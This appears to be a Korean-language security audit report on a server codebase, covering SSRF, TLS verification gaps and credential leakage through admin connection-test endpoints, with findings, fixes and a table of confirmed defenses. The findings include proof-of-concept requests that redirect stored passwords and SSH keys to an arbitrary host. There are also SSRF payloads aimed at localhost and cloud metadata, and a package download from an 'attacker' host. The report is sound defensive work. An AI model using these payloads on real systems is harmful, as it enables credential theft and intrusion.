# 03 — SSRF · 아웃바운드 연결 · TLS 검증 · 연결테스트 자격증명 유출 감사 (읽기 전용)

- 대상: `/home/claude/the.dvc` v2.487.0 (`server/src`, `pyportal/hub`) — 코드에서 직접 확인한 항목만 기재.
- 기준 문서: `server/CLAUDE.md`(SSRF 가드·"연결 테스트는 저장 비밀번호를 물려받을 때 host/url 도 저장값으로 고정"(v2.480)·TLS 디스패처 규칙), `docs/AUDIT-2026-08-17.md`, `docs/AUDIT-2026-09-09/11.md`, `security_check_20260809.MD`.
- 이미 수정 확인된 항목(vCenter/NSX/iDRAC/Horizon/PDU/스토리지/SAN/수집기 test 의 host 고정, 웹훅 resolved 가드+redirect manual, pyportal 핀 연결, AD TLS 기본 검증 ON 등)은 재보고하지 않고 §B 에 '양호'로만 기록.

---

## A. 발견 사항

### A-1 [HIGH · CWE-522/CWE-918] `/api/remote/test`·`/api/remote/deploy/test` — `********` 플레이스홀더로 저장 비밀번호·SSH 개인키를 물려받으면서 **url/host 는 요청값 그대로** (v2.480 규칙 미적용 잔존)

- 파일: `server/src/routes/remote.js:164-178`
  ```js
  remoteRouter.post('/test', adminOnly, async (req, res) => {
    const proxy = getProxyById((req.body || {}).proxyId);
    const dp = { ...proxy.dataplane, ...((req.body || {}).dataplane || {}) };
    if (dp.password === '********') dp.password = proxy.dataplane.password;   // 저장 비번 이월
    res.json(await testDataplane(dp));                                          // dp.url 은 body 값
  });
  remoteRouter.post('/deploy/test', adminOnly, async (req, res) => {
    const proxy = getProxyById((req.body || {}).proxyId);
    const dep = { ...proxy.deploy, ...((req.body || {}).deploy || {}) };
    if (dep.password === '********') dep.password = proxy.deploy.password;     // 저장 비번 이월
    if (dep.privateKey === '********') dep.privateKey = proxy.deploy.privateKey; // 저장 개인키 이월
    res.json(await testDeploy(dep));                                            // dep.host 는 body 값
  });
  ```
- 전송 경로:
  - `proxy/dataplane.js:14-27` `call()` — `Authorization: Basic base64(username:password)` 를 `dp.url` 로 전송(`resilientFetch`, 기본 `wanAgent`). **`dp.url` 에 SSRF 가드 없음**(`ssrfBlockReason` 미호출).
  - `proxy/deploy.js:82-86` `testDeploy()` — `withSsh({host: deploy.host, password, privateKey})` 로 SSH 접속. `host` 에 `ipBlockReason` 등 가드 없음.
- 전제: `admin` 역할(`requireRole('admin')`, 설정 소유자 불필요). `/api/remote` 는 `authMiddleware+requireEnrolled` 뒤(index.js:173) 이므로 등록 완료 admin.
- PoC (관리자 세션):
  ```http
  POST /api/remote/test
  {"proxyId":"default","dataplane":{"url":"http://10.9.9.9:5555","username":"dpapi","password":"********"}}
  → 10.9.9.9:5555 가 `GET /v3/services/haproxy/configuration/global` + Basic(dpapi:<저장된 평문 비번>) 을 수신

  POST /api/remote/deploy/test
  {"proxyId":"default","deploy":{"host":"10.9.9.9","port":22,"username":"root","password":"********","privateKey":"********"}}
  → 10.9.9.9 의 가짜 sshd 가 password 인증(평문) 수신; 개인키는 서명만 전송되나 대상 서버 root 개인키를 임의 호스트에 사용
  ```
  `proxyId` 를 `/api/remote/proxies/full`(adminOnly) 에서 얻은 추가 프록시 id 로 바꾸면 그 프록시의 자격증명도 동일하게 유출. `/remote/config`(GET) 응답이 `********` 로 가리는 것은 이 경로로 무력화된다(RDP/SSH 게이트웨이 프록시 서버의 root 자격증명 = 원격접속 인프라 완전 장악).
- 이것은 CLAUDE.md v2.480 규칙("저장 비밀번호를 물려받을 때 host/url 도 저장값으로 고정")이 vCenter/NSX/iDRAC/Horizon/PDU/스토리지/SAN/수집기에는 적용됐으나 **proxy(remote) 도메인에는 적용되지 않은 누락**이다. 같은 클래스인 uagmon M3 / relaytopo v2.435 / PDU S-1 과 동일.
- 수정: 플레이스홀더로 저장 비밀을 쓰는 경우 `dp.url`·`dp.basePath` / `dep.host`·`dep.port` 를 **저장값으로 강제**(`{...body, url: proxy.dataplane.url}`); 새 url/host 를 시험하려면 비밀번호·키를 함께 입력하도록. 추가로 `dp.url` 에 `ssrfBlockReasonResolved`, `dep.host` 에 `ipBlockReason` 적용. 회귀 테스트: `test/securityAudit*.test.js` 에 remote/test 케이스 추가.

### A-2 [MEDIUM · CWE-918] `GET /api/admin/packages?baseUrl=` · `POST /api/admin/packages/download {baseUrl}` — 요청 URL 에 SSRF 가드 없이 fetch, 응답 본문(JSON) 을 그대로 반환(full-read SSRF)

- 파일: `server/src/routes/admin/deployLlm.js:33-38, 44-47`; `server/src/upgrade/fetchPackage.js:18-24, 43-65`
  ```js
  adminRouter.get('/packages', adminOnly, async (req, res) => {
    ...
    try { remote = await fetchRemoteVersions(req.query.baseUrl || s.baseUrl); }   // 쿼리 baseUrl 무검증
    res.json({ dir: s.dir, baseUrl: s.baseUrl, settings: s, local: listLocalPackages(), remote }); // 응답 본문 반환
  });
  export async function fetchRemoteVersions(baseUrl) {
    const base = baseUrl || getPackageBaseUrl();
    const res = await resilientFetch(`${trim(base)}/versions.json`, { dispatcher: upgradeAgent, ... });
    return res.json();
  }
  ```
- `routes/upgrade.js:55-60 urlReason()` 은 **업그레이드 설정(remoteBase) 저장**에만 `ssrfBlockReason` 을 걸고, 패키지 소스(`savePackageSettings`, `packageSettings.js:39-47`)와 이 즉석 `baseUrl` 에는 검사가 없다(`security_check_20260809.MD` I-R2 "패키지 소스 baseUrl 가드 비대칭 — 문서화·후속" 이 그대로 열려 있음).
- 전제: admin. PoC: `GET /api/admin/packages?baseUrl=http://127.0.0.1:4000/api` → `remote` 에 `http://127.0.0.1:4000/api/versions.json` 응답 JSON(또는 오류 문자열) 반환; `http://169.254.169.254/latest/meta-data` 등도 동일(URL 은 `/versions.json` 접미가 붙지만 경로 끝에 `?` 를 넣으면 `…?/versions.json` 로 쿼리화 가능 — `trim()` 은 슬래시만 제거). `POST /packages/download {"baseUrl":"http://attacker/","kind":"installer"}` 는 공격자 versions.json 의 sha 로 자기 tarball 을 `packages.dir` 에 내려받게 함(설치 패키지 오염 — 단, admin 은 `/upgrade/bundle` 로 이미 번들 업로드가 가능하므로 권한 상승은 아님).
- 수정: `fetchRemoteVersions`/`downloadPackage` 진입 시 `ssrfBlockReasonResolved(base)`; `savePackageSettings` 에 `urlReason` 재사용; 응답 `remote` 는 스키마(`latest`,`versions[]`)만 추려 반환.

### A-3 [MEDIUM · CWE-295] 스토리지·SAN 스위치 REST 수집기 — TLS 검증 **무조건 해제**(환경변수 opt-in 조차 없음), Basic 자격증명이 검증 없는 TLS 로 전송

- 파일:
  - `server/src/sanswitch/collectors/fosRest.js:24` `const dispatcher = new Agent({ connect: { rejectUnauthorized: false } });` → `:80-88` `Authorization: Basic <user:pw>` 로 `/rest/login`
  - `server/src/storage/collectors/restCommon.js:9` 동일 → `:54-58, :72` Basic 인증
  - `server/src/storage/collectors/isilon.js:19` 동일
  - (참고) `horizon/horizon.js:23` 은 `HORIZON_TLS_VERIFY==='true'` 로만 검증(기본 off) — NSX(`NSX_TLS_REJECT_UNAUTHORIZED`)·vCenter(`VC_TLS_REJECT_UNAUTHORIZED`)와 같은 opt-in 패턴이라 정책상 허용 범위지만 기본이 off 임은 동일.
- 영향: 사내망 경로 상 MITM(ARP/DNS 스푸핑, 중계 엣지 장악)이 스토리지 어레이/SAN 스위치 관리자 자격증명을 수집. CLAUDE.md 는 "자체서명이 필요한 곳만 로컬 디스패처" 를 허용하지만, vCenter/NSX/Horizon/iDRAC(`config.rejectUnauthorized`)/업그레이드/SMTP/AD 는 모두 **검증을 켤 수 있는 스위치**가 있는 반면 이 세 파일은 켤 방법이 없다.
- 수정: `STORAGE_TLS_VERIFY` / `SANSWITCH_TLS_VERIFY`(또는 장비별 `tlsVerify` 필드) 로 `rejectUnauthorized: true` 선택 가능하게; 사설 CA 는 `NODE_EXTRA_CA_CERTS` 안내.

### A-4 [LOW · CWE-918] admin 전용 즉석 대상 프로브 3곳 — SSRF 가드 부재 또는 동기 가드만

1. `routes/admin/deployLlm.js:472-474` `/llm-test` — `ollamaTest({...loadLlmConfig(), ...req.body})` → `llm/ollama.js:26` `GET ${body.url}/api/tags`, 응답의 `models[].name` 목록을 반환(부분 read 오라클). `PUT /llm-config`(`llm/config.js:28-36`) 도 url 검증 없이 저장 → 이후 모든 NL 검색이 그 URL 로 POST. 가드 없음. 저장 비밀 없음.
2. `routes/admin/collectorsDc.js:361-378` `/collectors/test` — 즉석 `{url, token}` 은 **동기** `ssrfBlockReason` 만 통과(DNS 이름이 127.x/169.254 로 해석되면 통과) 후 `precheckTarget`+`resilientFetch`. 토큰은 요청자가 준 값이므로 자격증명 유출은 없음(저장 토큰 사용 시 URL 고정은 v2.480 에서 수정됨). `/register-collector`(central.js:226)·웹훅·svcmon http 는 resolved 가드인데 이 경로만 비대칭.
3. `routes/auth.js:202-205` `/ad-test` — `testAd(cfg)` 가 `{...loadAdConfig(), ...cfg}` 로 `cfg.url`(ldap://host:port) 을 무검증 접속(`auth/ad.js:266-272`). 저장 설정에 바인드 비밀번호가 없어(샘플 계정 비번은 요청자가 제공) 자격증명 유출은 아니고, 연결 성공/실패(`connect timeout` vs 오류) 로 사내 TCP 포트 오라클. `adminOnly+requireEnrolled` 게이트는 확인됨.

- 수정: (1)(3) `ssrfBlockReasonResolved` 적용(ldap 은 host:port 추출 후 `ipBlockReason`+dns lookup), (2) `ssrfBlockReasonResolved` 로 교체(핫패스 아님·1회성 라우트라 CLAUDE.md 의 "타임아웃 없는 DNS 조회 핫패스 금지" 에 저촉되지 않음).

### A-5 [LOW · CWE-367] DNS 리바인딩(검증 IP 미핀) — 기존 보류 항목 현황 (변경 없음, 참고)

- `vcenter/relayProbe.js:157` 은 `ssrfBlockReasonResolved` 후 `:33,:48` 에서 호스트명으로 재접속(AUDIT-09-09 S11 보류 그대로). `security/certMonitor.js:86` 도 resolved 가드 후 `probeCert(t.host)` 호스트명 재해석. `svcmon/checker.js` 비-HTTP 점검은 문서화된 보류. uagmon(`uag.js fetchUagStats`)·pyportal(`hub/pinned.py`) 만 핀 패턴 적용. 신규 회귀는 아니므로 재보고 아님 — 위험 낮음(admin 전용·오라클 수준).

### 추정(미검증) — 보고 대상 아님, 참고만
- `resilientFetch` 는 `redirect` 미지정 시 fetch 기본 `follow`. 수집기 pull(`X-Collector-Token` 커스텀 헤더) 이 3xx 를 따라가면 헤더가 리다이렉트 대상에 그대로 실린다(undici 는 `Authorization` 만 cross-origin 에서 제거). 다만 전송되는 토큰은 리다이렉트를 보낸 **그 엣지 자신의** 토큰이라 추가 이득이 없어 보인다 — 추정, 실질 영향 없음으로 판단.

---

## B. 확인된 양호한 방어 (파일 근거)

| 영역 | 근거 |
|---|---|
| 저장 비밀번호 이월 시 host 고정(v2.480) | `vcenter/registry.js:170`(host+port), `nsx/registry.js:118`, `idrac/registry.js:344`, `horizon/horizon.js:157`, `routes/api/pdu.js:181-185`(saved.host===body.host 일 때만), `routes/api/sanSwitch.js:151-155`, `routes/api/storageMon.js:86-92`(host 변경 시 400+안내), `routes/admin/collectorsDc.js:365-368`(저장 토큰→URL 고정)·`:440`(force-token) |
| relaytopo | `relaytopo/store.js:56-66` host 변경 시 ssh 비밀 전부 폐기(`_secretsDropped`), `relaytopo/ops.js:35` `ipBlockReason`, `:46-68` 배포 대상 자격증명은 host 일치 시에만(IRS 는 중계 엣지=배포 대상일 때만) |
| 통합 계정(credentialStore) | `security/credentialStore.js:153` hosts 허용목록에 `ssrfBlockReason`; `routes/api/credentials.js:80-96` 테스트는 `credentialUsable(id,{agent,host})` 범위 검사 후 RMA 잡으로만(중앙이 비밀을 직접 전송하지 않음) |
| GPU 게스트/물리 테스트 | `routes/admin/gpuGuest.js:238-249` `{id}` 지정 시 host/username/password 전부 저장값; `:344-360` test-ssh 는 요청 자격증명만; `revealCreds` 는 `shared.js:44 maskPw`(길이만) |
| 에이전트 배포 | `agent/deploy.js:87,141-157` `testTarget` 은 body 자격증명만 사용(저장 병합 없음); `agent/bulkDeploy.js:132` `ipBlockReason`; `deployRegistry SECRET_KEYS` 4종·비밀 CSV 는 `requireSettingsOwner`(`deployLlm.js:127-137`) |
| SSRF 가드 구현 | `collector/registry.js:103-200` 8/10/16진수·IPv4-mapped·NAT64·IPv6 링크로컬/ULA·localhost 이름 차단, RFC1918 허용; `ssrfBlockReasonResolved`(DNS 해석) 적용처: 웹훅(`alerts.js:223`+`redirect:'manual'`+검증 ON `webhookAgent:218`), `opsSettings.js:34`, `central.js:226`, `svcmon/checker.js:101`, `certMonitor.js:86`, `horizon.js:165`, `relayProbe.js:157`; 동기 가드: pdu/storage/sanswitch/rma/upgrade settings/collectors normalize |
| TLS | `setGlobalDispatcher`·`NODE_TLS_REJECT_UNAUTHORIZED` 쓰기 **없음**(grep 0건); `util/resilientFetch.js:26` `WAN_TLS_INSECURE==='true'` 일 때만 해제(+기동 경고); 업그레이드 다운로드 전부 `upgradeAgent`(`bundleSource.js:71`, `fetchPackage.js:21,65`, `upgrade.js:332,375,459`); SMTP `util/smtp.js:219,236` 기본 검증·`mail/settings.js:97`; AD `auth/ad.js:35` `AD_TLS_REJECT_UNAUTHORIZED!=='false'`(06-27 M3 수정 확인); 인증서/지문 프로브(`soapClient.js:34`, `certMonitor.js:40`, `relayProbe.js:33,48`)는 인증서 읽기 전용이라 검증 off 가 타당 |
| 비밀 응답/로그 | `proxy/registry.js:140-146` redactProxy·`getConfigSafe`; `mail/settings.js redact`(hasPassword); `upgrade/settings.js:55-65` token 제거; `packageSettings.js:28-37` hasToken; `llm-config` 에 비밀 필드 없음; `collectorsDc`/`collector/registry.js:75` hasToken; `sanswitch testRuns` 응답 device 미포함(라우트 주석 및 `getTestRun`); SMTP 추적 `AUTH … <redacted>`(`smtp.js:250-252`); `storage/collectors/restCommon.js:48` 오류문에서 비밀번호 마스킹; console.* 에 비밀 값 출력 grep 0건 |
| 웹훅 | `alerts.js:218-226` 검증 ON 전용 디스패처 + 전송 직전 resolved 가드 + 리다이렉트 미추적; `buildTeamsPayload` 는 JSON 필드로만(템플릿 문자열 삽입 없음) |
| pyportal | `hub/ssrf.py normalize_url`(javascript:/data: 차단·포트 검증)·`resolve_and_check`; `hub/health.py:76-80,148-152` 검증 IP 로 핀 접속(`hub/pinned.py:40-70`, SNI 는 원 호스트), `_NoRedirect`, TLS 검증은 호출별 컨텍스트(전역 미변경, `HUB_HEALTH_TLS_VERIFY` 기본 True); `hub/notify.py:151-162` 웹훅도 가드+핀 |
| 게이트 | `/api/admin`·`/api/remote` 모두 `authMiddleware+requireEnrolled`(index.js:172-173); `ad-test` 는 `...adminOnly`(`authMiddleware, requireEnrolled, requireRole('admin')`) |

---

## C. 우선순위 요약

1. **A-1 (HIGH)** `routes/remote.js:164-178` — 즉시 v2.480 규칙 적용(url/host 저장값 고정 + SSRF/ipBlock 가드). 회귀 테스트 추가.
2. **A-2 (MEDIUM)** 패키지 소스 baseUrl(쿼리/바디/저장) `ssrfBlockReasonResolved` + 응답 스키마 축소.
3. **A-3 (MEDIUM)** 스토리지/SAN 수집기 TLS 검증 opt-in 스위치 신설.
4. **A-4 (LOW)** llm-test/llm-config·collectors/test 즉석 URL·ad-test url 에 resolved 가드.
